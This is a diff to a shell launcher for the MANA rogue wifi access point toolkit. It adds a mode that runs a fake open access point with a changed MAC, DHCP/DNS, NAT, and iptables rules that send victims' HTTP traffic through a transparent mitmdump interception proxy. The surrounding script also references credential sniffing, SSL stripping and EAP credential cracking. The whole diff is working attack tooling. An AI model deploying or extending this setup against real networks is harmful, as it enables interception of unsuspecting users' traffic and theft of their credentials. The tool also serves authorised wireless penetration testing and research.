@@ -126,6 +126,12 @@ start_msfconsole(){
         msfconsole -r $etc/karmetasploit.rc&
 }
 
+start_mitmdump(){
+	iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+	mitmdump --mode transparent
+}
+
 hangon(){
         echo -e "\n"
         echo -e "$txtgrn [*]The captured traffic will be in $loot \n $endclr"
@@ -173,7 +179,7 @@ exit
 
 
 start-nat-full(){
-export conf=$share/run-mana/conf/hostapd.conf
+export conf=$share/run-mana/conf/hostapd.conf_open
 echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
 echo -e "$txtgrn [*] Changing hostname $endclr"
@@ -220,7 +226,7 @@ echo -e "$txtgrn [*] Starting netcreds $endclr"
 
 start-nat-simple(){
 #export conf=$share/run-mana/conf/hostapd.conf
-export conf=/tmp/mana_clean/run-mana/conf/hostapd.conf_wpa2
+export conf=$share/run-mana/conf/hostapd.conf_open
 echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
  ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
 echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
@@ -239,6 +245,36 @@ echo -e "$txtgrn [*] Starting nat-firewall $endclr"
   sleep 2
 	hangon && #Wait for Enter key
 	killem	  #Kill all shit and exit
+
+}
+
+
+start-nat-simple-mitm(){
+#export conf=$share/run-mana/conf/hostapd.conf
+export conf=$share/run-mana/conf/hostapd.conf_open
+echo -e "$txtgrn [*] Checking if AP-mode supported interface is present $endclr"
+ ./$0 --check_ap_mode    #Check if "AP-mode" supported interface is present
+echo -e "$txtgrn [*] Stopping network-manager & unblocking wifi $endclr"
+ ./$0 --clearwifi        #Stop network-manager &rfkill unblock wifi
+echo -e "$txtgrn [*] Changing MAC $endclr"
+ ./$0 --start_macchanger #Change mac
+  sleep 4
+echo -e "$txtgrn [*] Starting hostapd $endclr"
+ ./$0 --start_hostapd && #Hostapd - Start modified hostapd that implements new mana attacks
+  sleep 5
+echo -e "$txtgrn [*] Starting dnsmasq $endclr"
+ ./$0 --start_dnsmasq && #Dnsmasq - A lightweight DHCP and caching DNS server
+  sleep 5
+echo -e "$txtgrn [*] Starting nat-firewall $endclr"
+ ./$0 --start_nat_firewall && #Nat firewall
+  sleep 2
+echo -e "$txtgrn [*] Starting mitmdump $endclr"
+ ./$0 --start_mitmdump && #Mitmdump - A man-in-the-middle proxy with a command-line interface
+  sleep 2
+
+	hangon && #Wait for Enter key
+	killem	  #Kill all shit and exit
+
 
 }
 
@@ -347,6 +383,7 @@ echo "$FUNCNAME"
     echo $"""
  Usage: $(basename "$0") [-f] [--start-nat-full]      - Will fire up MANA in NAT mode (you'll need an upstream link) with all the MitM bells and whistles.
  Usage: $(basename "$0") [-s] [--start-nat-simple     - Will fire up MANA in NAT mode, but without any of the firelamb, sslstrip, sslsplit etc.
+ Usage: $(basename "$0") [-m] [--start-nat-simple-mitm- Will fire up MANA in NAT mode, with mitmdump
  Usage: $(basename "$0") [-n] [--start-noupstream     - Will start MANA in a "fake Internet" mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.
  Usage: $(basename "$0") [-e] [--start-noupstream-eap - Will start MANA with the EAP attack and noupstream mode.
 
@@ -364,6 +401,7 @@ echo "$FUNCNAME"
  Usage: $(basename "$0") [--msfconsole]               - Msfconsole
  Usage: $(basename "$0") [--start_crackapd]           - Crackapd - Crack EAP creds externally & re-add them to the hostapd EAP config (auto crack 'n add)
  Usage: $(basename "$0") [--start_apache]             - Apache - The apache vhosts for the noupstream hacks; deploy to /etc/apache2/ and /var/www/ respectivley
+ Usage: $(basename "$0") [--start_mitmdump]           - Mitmdump - A man-in-the-middle proxy with a command-line interface
 
  Usage: $(basename "$0") [-e] [--edit]   | Edit this file.
  Usage: $(basename "$0") [-h] [--help]   | Print this help.
@@ -394,6 +432,7 @@ for ARG in $@
       --start_firelamb)  	   start_firelamb       ;;
       --start_netcreds)  	   start_netcreds       ;;
       --start_msfconsole)	   start_msfconsole     ;;
+      --start_mitmdump)	           start_mitmdump       ;;      
       --hangon)  		   hangon               ;;
       --killem)  		   killem               ;;
    #Main launchers
